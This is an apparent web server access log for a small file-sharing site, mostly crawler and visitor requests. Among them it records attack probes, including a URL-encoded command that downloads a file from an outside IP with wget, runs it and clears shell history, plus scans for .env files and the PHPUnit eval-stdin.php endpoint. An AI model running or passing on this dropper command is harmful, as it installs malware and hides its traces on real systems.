74.125.151.77 - - [05/Jul/2022:13:36:59 +0000] "GET /?gclid=EAIaIQobChMIwPu5t4qs3AIVAQAAAB0BAAAAEAAYACAAEgJVzfD_BwE HTTP/1.1" 200 10128 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.81 - - [05/Jul/2022:13:37:01 +0000] "GET /static/Index.css HTTP/1.1" 200 7494 "https://fsharely.com/?gclid=EAIaIQobChMIwPu5t4qs3AIVAQAAAB0BAAAAEAAYACAAEgJVzfD_BwE" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.77 - - [05/Jul/2022:13:37:01 +0000] "GET /static/Fonts.css HTTP/1.1" 200 531 "https://fsharely.com/?gclid=EAIaIQobChMIwPu5t4qs3AIVAQAAAB0BAAAAEAAYACAAEgJVzfD_BwE" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.77 - - [05/Jul/2022:13:37:11 +0000] "GET /pinUI HTTP/1.1" 200 8349 "https://fsharely.com/?gclid=EAIaIQobChMIwPu5t4qs3AIVAQAAAB0BAAAAEAAYACAAEgJVzfD_BwE" "AdsBot-Google (+http://www.google.com/adsbot.html)"
13.215.122.116 - - [05/Jul/2022:13:38:36 +0000] "GET / HTTP/1.1" 200 28670 "-" "axios/0.26.1"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:13:38:37 +0000] "GET / HTTP/1.1" 200 10159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:13:38:40 +0000] "GET / HTTP/1.1" 200 10159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"
13.215.122.116 - - [05/Jul/2022:13:41:26 +0000] "GET / HTTP/1.1" 200 24250 "-" "axios/0.26.1"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:13:41:28 +0000] "GET / HTTP/1.1" 200 10159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:13:41:33 +0000] "GET / HTTP/1.1" 200 10159 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
192.241.222.159 - - [05/Jul/2022:13:44:20 +0000] "GET /version HTTP/1.1" 404 4921 "-" "Mozilla/5.0 zgrab/0.x"
74.125.151.77 - - [05/Jul/2022:13:45:29 +0000] "GET / HTTP/1.1" 200 10128 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.77 - - [05/Jul/2022:13:46:17 +0000] "GET /static/Fonts.css HTTP/1.1" 200 5260 "https://fsharely.com/" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.81 - - [05/Jul/2022:13:46:17 +0000] "GET /static/Index.css HTTP/1.1" 200 7494 "https://fsharely.com/" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.81 - - [05/Jul/2022:13:46:20 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "AdsBot-Google (+http://www.google.com/adsbot.html)"
74.125.151.77 - - [05/Jul/2022:13:46:23 +0000] "GET /sw.js HTTP/1.1" 200 7557 "https://fsharely.com/" "AdsBot-Google (+http://www.google.com/adsbot.html)"
44.204.173.32 - - [05/Jul/2022:13:47:30 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
44.204.173.32 - - [05/Jul/2022:13:47:30 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
45.61.185.76 - - [05/Jul/2022:13:54:14 +0000] "GET /shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F45.124.84.253%2F.22%20-O%20Onxa%3B%20chmod%20777%20Onxa%3B%20sh%20Onxa%3Brm%20-rf%20Onxa%3Bclear%3Bhistory%20-c%3B%20clear%3Bhistory%20-w HTTP/1.1" 301 888 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
77.88.5.88 - - [05/Jul/2022:13:56:56 +0000] "GET /robots.txt HTTP/1.1" 301 585 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
2a02:6b8:c18:3908:0:492c:db48:0 - - [05/Jul/2022:13:56:56 +0000] "GET /robots.txt HTTP/1.1" 404 5185 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.5.88 - - [05/Jul/2022:13:57:00 +0000] "GET / HTTP/1.1" 301 564 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.66 - - [05/Jul/2022:13:59:01 +0000] "GET /robots.txt HTTP/1.1" 404 5185 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.5.161 - - [05/Jul/2022:13:59:04 +0000] "GET / HTTP/1.1" 200 10144 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.42 - - [05/Jul/2022:13:59:08 +0000] "GET /pinUI HTTP/1.1" 200 8365 "https://fsharely.com/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268"
77.88.5.161 - - [05/Jul/2022:13:59:36 +0000] "GET /cookies HTTP/1.1" 200 10103 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.70.82 - - [05/Jul/2022:14:08:05 +0000] "GET / HTTP/1.1" 200 10128 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.82 - - [05/Jul/2022:14:08:13 +0000] "GET / HTTP/1.1" 200 10128 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.82 - - [05/Jul/2022:14:08:14 +0000] "GET /sw.js HTTP/1.1" 200 7557 "https://fsharely.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/102.0.5005.115 Safari/537.36"
66.249.70.78 - - [05/Jul/2022:14:08:40 +0000] "GET /favicon.ico HTTP/1.1" 404 5169 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:40 +0000] "GET /static/Images/apple-touch-icon-152x152.png HTTP/1.1" 200 10132 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:41 +0000] "GET /static/Images/favicon.ico HTTP/1.1" 200 34906 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:42 +0000] "GET /static/Images/apple-touch-icon-76x76.png HTTP/1.1" 200 3810 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:43 +0000] "GET /static/Images/apple-touch-icon.png HTTP/1.1" 200 2457 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:44 +0000] "GET /static/Images/apple-touch-icon-57x57.png HTTP/1.1" 200 2457 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:14:08:54 +0000] "GET /static/Images/apple-touch-icon-114x114.png HTTP/1.1" 200 12991 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:14:09:01 +0000] "GET /static/Images/apple-touch-icon-72x72.png HTTP/1.1" 200 7895 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:14:09:06 +0000] "GET /static/Images/apple-touch-icon-120x120.png HTTP/1.1" 200 11509 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:14:09:07 +0000] "GET /static/Images/apple-touch-icon-144x144.png HTTP/1.1" 200 6939 "-" "Googlebot-Image/1.0"
185.254.196.223 - - [05/Jul/2022:14:10:00 +0000] "GET /.env HTTP/1.1" 301 579 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Jul/2022:14:10:00 +0000] "POST / HTTP/1.1" 301 571 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.158.161.66 - - [05/Jul/2022:14:11:19 +0000] "GET / HTTP/1.1" 301 565 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268"
185.7.214.104 - - [05/Jul/2022:14:16:38 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 634 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:14:16:50 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 5128 "http://172.104.146.10:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.227.20.68 - - [05/Jul/2022:14:16:53 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
54.227.20.68 - - [05/Jul/2022:14:16:54 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
77.88.5.161 - - [05/Jul/2022:14:17:33 +0000] "GET / HTTP/1.1" 301 565 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268"
45.134.144.200 - - [05/Jul/2022:14:18:25 +0000] "GET /ext-js/app/common/zyFunction.js HTTP/1.1" 404 4977 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
66.249.70.95 - - [05/Jul/2022:14:20:04 +0000] "GET /roundup-warnschuss-und-familiare-verwerfungen-weiter-zoff-um-super-league/ HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [05/Jul/2022:14:22:05 +0000] "GET / HTTP/1.1" 200 10128 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [05/Jul/2022:14:22:08 +0000] "GET / HTTP/1.1" 200 10128 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [05/Jul/2022:14:22:09 +0000] "GET /pinUI HTTP/1.1" 200 8349 "https://www.fsharely.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [05/Jul/2022:14:22:09 +0000] "GET /pinUI HTTP/1.1" 200 8349 "https://www.fsharely.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/102.0.5005.115 Safari/537.36"
66.249.64.169 - - [05/Jul/2022:14:22:10 +0000] "GET /sw.js HTTP/1.1" 200 2828 "https://www.fsharely.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [05/Jul/2022:14:22:10 +0000] "GET /sw.js HTTP/1.1" 200 2828 "https://www.fsharely.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/102.0.5005.115 Safari/537.36"
66.249.64.167 - - [05/Jul/2022:14:22:27 +0000] "GET /static/Images/apple-touch-icon-152x152.png HTTP/1.1" 200 14861 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:32 +0000] "GET /static/Images/apple-touch-icon-114x114.png HTTP/1.1" 200 12991 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:35 +0000] "GET /static/Images/apple-touch-icon-72x72.png HTTP/1.1" 200 3166 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:38 +0000] "GET /static/Images/apple-touch-icon-144x144.png HTTP/1.1" 200 6939 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:41 +0000] "GET /static/Images/apple-touch-icon.png HTTP/1.1" 200 2457 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:46 +0000] "GET /static/Images/favicon.ico HTTP/1.1" 200 39635 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:46 +0000] "GET /static/Images/apple-touch-icon-76x76.png HTTP/1.1" 200 3810 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:22:48 +0000] "GET /favicon.ico HTTP/1.1" 404 440 "-" "Googlebot-Image/1.0"
66.249.64.171 - - [05/Jul/2022:14:23:12 +0000] "GET /static/Images/apple-touch-icon-57x57.png HTTP/1.1" 200 7186 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:14:23:12 +0000] "GET /static/Images/apple-touch-icon-120x120.png HTTP/1.1" 200 11509 "-" "Googlebot-Image/1.0"
66.249.83.92 - - [05/Jul/2022:14:33:12 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.195 - - [05/Jul/2022:14:33:13 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.92 - - [05/Jul/2022:14:33:16 +0000] "GET / HTTP/1.1" 301 564 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.80 - - [05/Jul/2022:14:33:16 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.52 - - [05/Jul/2022:14:33:37 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.63 - - [05/Jul/2022:14:33:37 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.120 - - [05/Jul/2022:14:33:38 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.32 - - [05/Jul/2022:14:33:38 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.122 - - [05/Jul/2022:14:37:00 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.223 - - [05/Jul/2022:14:37:00 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.120 - - [05/Jul/2022:14:41:35 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.35 - - [05/Jul/2022:14:41:35 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
185.7.214.104 - - [05/Jul/2022:14:45:53 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 634 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.83.208 - - [05/Jul/2022:14:45:56 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.63 - - [05/Jul/2022:14:45:56 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
185.7.214.104 - - [05/Jul/2022:14:46:01 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 5128 "http://172.104.146.10:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.83.92 - - [05/Jul/2022:14:46:04 +0000] "GET / HTTP/1.1" 301 565 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.107 - - [05/Jul/2022:14:46:05 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.92 - - [05/Jul/2022:14:46:05 +0000] "GET / HTTP/1.1" 301 564 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
66.249.83.193 - - [05/Jul/2022:14:46:06 +0000] "GET / HTTP/1.1" 200 10128 "-" "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
5.188.210.227 - - [05/Jul/2022:14:51:09 +0000] "GET / HTTP/1.0" 400 622 "-" "-"
46.135.69.145 - - [05/Jul/2022:14:52:58 +0000] "GET / HTTP/1.1" 200 9996 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:52:58 +0000] "GET /static/Fonts.css HTTP/1.1" 200 531 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:52:58 +0000] "GET /static/Index.css HTTP/1.1" 200 7509 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:52:59 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:52:59 +0000] "GET /static/Pin.css HTTP/1.1" 200 1292 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:06 +0000] "GET /help HTTP/1.1" 200 6026 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:06 +0000] "GET /static/Images/pointer.svg HTTP/1.1" 200 572 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:06 +0000] "GET /static/helpUI.css HTTP/1.1" 200 5706 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:06 +0000] "GET /contact-Enter_your_problem-Contact_Us-1-0 HTTP/1.1" 200 5474 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:06 +0000] "GET /static/ContactUs.css HTTP/1.1" 200 826 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
44.200.72.138 - - [05/Jul/2022:14:53:22 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
44.200.72.138 - - [05/Jul/2022:14:53:22 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28488 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
46.135.69.145 - - [05/Jul/2022:14:53:24 +0000] "GET /pinUI HTTP/1.1" 200 8364 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:24 +0000] "GET /help HTTP/1.1" 200 6026 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:53:24 +0000] "GET /contact-Enter_your_problem-Contact_Us-1-0 HTTP/1.1" 200 730 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
2620:101:2002:11a5:10:8:141:61 - - [05/Jul/2022:14:59:06 +0000] "GET / HTTP/1.1" 301 540 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2620:101:2002:11a5:10:8:141:61 - - [05/Jul/2022:14:59:07 +0000] "GET / HTTP/1.1" 200 28439 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2620:101:2002:11a5:10:8:141:61 - - [05/Jul/2022:14:59:09 +0000] "GET /cookies HTTP/1.1" 301 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2620:101:2002:11a5:10:8:141:61 - - [05/Jul/2022:14:59:10 +0000] "GET /cookies HTTP/1.1" 200 37494 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
46.135.69.145 - - [05/Jul/2022:14:59:22 +0000] "GET / HTTP/1.1" 200 9991 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:59:22 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:59:23 +0000] "GET /help HTTP/1.1" 200 1282 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:59:23 +0000] "GET /contact-Enter_your_problem-Contact_Us-1-0 HTTP/1.1" 200 730 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:59:33 +0000] "GET / HTTP/1.1" 200 9991 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:14:59:34 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:00:10 +0000] "GET / HTTP/1.1" 200 9991 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:00:10 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:02:15 +0000] "GET / HTTP/1.1" 200 9991 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:02:16 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:02:22 +0000] "GET /help HTTP/1.1" 200 6026 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:02:22 +0000] "GET /contact-Enter_your_problem-Contact_Us-1-0 HTTP/1.1" 200 730 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
206.54.181.21 - - [05/Jul/2022:15:04:33 +0000] "GET /sw.js HTTP/1.1" 200 10312 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
186.46.58.174 - - [05/Jul/2022:15:04:42 +0000] "GET / HTTP/1.0" 301 534 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
66.249.70.95 - - [05/Jul/2022:15:05:04 +0000] "GET /aktien-frankfurt-dax-moderat-hoher-mehr-schwung-bei-nebenwerten/ HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.135.69.145 - - [05/Jul/2022:15:06:25 +0000] "GET / HTTP/1.1" 200 9986 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:06:26 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:06:26 +0000] "GET /help HTTP/1.1" 200 1282 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:06:26 +0000] "GET /contact-Enter_your_problem-Contact_Us-1-0 HTTP/1.1" 200 730 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
13.215.122.116 - - [05/Jul/2022:15:09:08 +0000] "GET / HTTP/1.1" 200 28605 "-" "axios/0.26.1"
